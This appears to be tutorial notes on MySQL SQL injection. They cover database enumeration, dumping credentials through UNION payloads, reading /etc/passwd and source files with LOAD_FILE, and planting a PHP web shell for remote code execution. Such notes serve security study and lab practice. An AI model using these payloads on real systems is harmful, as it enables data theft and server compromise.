## 1- Database Enumeration
####  MySQL Fingerprinting
 fingerprint DBMS first â€” queries differ per DBMS. If you get direct output use `@@version`; if numeric-only use `POW()`; if blind use `SLEEP()` tests.

```sql
-- full output
SELECT @@version;        -- returns MySQL/MariaDB version string (e.g. 10.3.22-MariaDB-1ubuntu1)

-- numeric-only output
SELECT POW(1,1);         -- returns 1 when only numeric output is allowed

-- blind/no-output (time-based)
SELECT SLEEP(5);         -- delays response (used to detect MySQL in blind scenarios)
```

>don't rely on webserver (Apache/IIS) as a DBMS fingerprint â€” it's only a hint. **Always confirm with queries.**
####  INFORMATION_SCHEMA Database
To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

 Use info schema to discover DB structure (databases â†’ tables â†’ columns)
`INFORMATION_SCHEMA` holds metadata , use it to list DBs, tables, columns. To query an object in another DB use `db_name.table_name` (dot operator).

```sql
-- reference table in another DB
SELECT * FROM my_database.users;   -- dot operator -> db.table
```

**Key:** INFORMATION_SCHEMA itself is a DB , reference its tables with `INFORMATION_SCHEMA.<TABLE>` in your payloads.
#### SCHEMATA (list databases)
The table **SCHEMATA** in the **INFORMATION_SCHEMA** database contains information about all databases on the server.
**SCHEMA_NAME** column in the **SCHEMATA** DB contains all the database names currently present.

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
-- UNION payload example (SQLi)
 cn' UNION SELECT 1, SCHEMA_NAME, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

> After listing, run `SELECT database();` to find the current DB used by the web app.
#### TABLES (list tables in a DB)
The **TABLES** table  in the **INFORMATION_SCHEMA**  db contains information about all tables throughout the database
 **INFORMATION_SCHEMA.TABLES** has `TABLE_SCHEMA`  (db name )and `TABLE_NAME` (table name )columns .

```sql
-- list all tables in dev
SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev';

-- UNION SQLi example
cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'-- -
```

> always add `WHERE table_schema='target_db'` to narrow output and save noise.
#### COLUMNS (list columns in a table)
the **COLUMNS** table in the **NFORMATION_SCHEMA** database. The **COLUMNS**  table contains information about all columns present in all the databases

 **INFORMATION_SCHEMA.COLUMNS** provides `COLUMN_NAME`, `TABLE_NAME`, `TABLE_SCHEMA`(the db of that columns). Use it to find columns.

```sql
SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials';

-- UNION SQLi example
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'-- -
```

> table names may repeat across schemas â€” use `TABLE_SCHEMA` to confirm which DB owns it.

#### Data (dump table columns via UNION)

 Once you have DB â†’ table â†’ columns, replace filler columns in the original query with the real column names and reference `db.table`.

```sql
-- dump username + password from dev.credentials
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -

-- general pattern (adjust column count/positions to match original query):
-- <orig>' UNION SELECT col1, col2, col3, ... FROM <db>.<table>-- -
```

>**Critical:** match the number and type (where possible) of columns expected by the original query. **Never forget the dot operator** when target table is in another DB.


---


## 2- Reading Files

Use SQLi to read/write server files (reading more common; writing requires extra privileges)
#### DB User
 SQLi can access filesystem if DB user has privileges (e.g., `FILE` in MySQL). First enumerate current DB user and privileges to decide if file ops are possible.

```sql
-- get current DB user
SELECT USER();            -- returns user@host
SELECT CURRENT_USER();

-- check mysql.user or information_schema for privileges
SELECT user FROM mysql.user;
SELECT super_priv FROM mysql.user WHERE user='root';
SELECT grantee, privilege_type FROM information_schema.user_privileges;
```

> writing files or executing code usually requires high privileges (DBA / FILE priv ).

#### DB User
 Find which DB user you are 
 use `USER()` / `CURRENT_USER()` or query `mysql.user`. If user is `root` (or a DBA-like user) more file ops likely allowed.
```sql
SELECT USER()  --> root@localost
SELECT CURRENT_USER() --> root@localost
SELECT user from mysql.user --> root@localost

-- UNION examples for SQLi (adjust positions to match original query)
cn' UNION SELECT 1, USER(), 3, 4-- - 
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
```
==--> root@localost==
> `root` often implies high privileges â€” proceed to check specific privileges next.

#### User Privileges

**Enumerate privileges to see if FILE/read/write allowed:**
check `super_priv` in `mysql.user` or `information_schema.user_privileges` for explicit privileges like `FILE`, `SELECT`, `INSERT`, `UPDATE`.

```sql
-- check super privilege
SELECT super_priv FROM mysql.user WHERE user='root';

-- union vertion
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - for the current user (root)

-----------------------------------
-- list granted privileges : FILE ..., UPDATE , DELECT .....

SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'";
--- with union 
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - 
```
**presence of `FILE` privilege permits LOAD_FILE() and potential file read/write workflows.**

#### Find the Web Root PATH

>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.


#### LOAD_FILE 

Read local files with `LOAD_FILE()` if allowed by OS file permissions and DB privileges
`LOAD_FILE('/path/to/file')` returns file contents if MySQL has filesystem access and file is readable by the OS user running MySQL.

```sql
-- test reading /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- UNION SQLi example to inject into page output
cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

 OS file permissions matter , MySQL process must be able to read target file.
####  Example: read app source

Read webroot files to leak source code / creds
 target common webroot paths (e.g., `/var/www/html/search.php`) to obtain source code, DB creds, or logic.
```sql
-- read the web page source
 cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

>retrieved HTML/PHP may render in browser; view raw with browser "view-source" or save output to inspect credentials and vulnerabilities.


## 3- Writing Files
 **Using SQLi to write files â†’ leads to web shells & RCE**

 Modern DBMS restrict writing files heavily. To write files via SQL injection we need:  
1.  DB user has `FILE` privilege  
2. `secure_file_priv` allows writing  
3.  Target directory is writable by MySQL OS user
### Check Write Permissions

#### FILE priv
```SQL
-- list granted privileges : FILE ..., UPDATE , DELECT .....

SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'";
--- with union 
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

#### secure_file_priv
 `secure_file_priv` defines allowed file read/write locations.

```sql
-- preferred (normal SQL)
SHOW VARIABLES LIKE 'secure_file_priv';

-- union injection  
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```
âœ… Empty value â†’ read/write anywhere  
ðŸ“ Set folder â†’ restricted to that folder  
ðŸš« NULL â†’ no file read/write allowed
### SELECT INTO OUTFILE
after we Confirmed that our user should write files to the back-end server:
 **Write table data or custom strings into filesystem:**
 
 append `INTO OUTFILE 'path'` to write results as a file.
```sql
-- write table to file
SELECT * FROM users INTO OUTFILE '/tmp/credentials';

-- write arbitrary string
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
Files are created as MySQL OS user (`mysql:mysql`) and require valid directory permissions.
###  Writing Files via SQL Injection

**Try writing a test file into webroot (proof of write access):**
```sql
-- SQLi payload example
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```
Check in browser:   `http://target/proof.txt` âœ… â†’ writing works

>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
### Writing a Web Shell

**Write PHP one-liner shell and execute commands in browser**
 once write confirmed â†’ upload webshell â†’ RCE
```sql
-- PHP webshell payload
<?php system($_REQUEST[0]); ?>

-- SQLi payload writing the shell
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Execute command in browser:   `http://target/shell.php?0=id` => `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 âœ… You now have remote code execution via SQL injection.
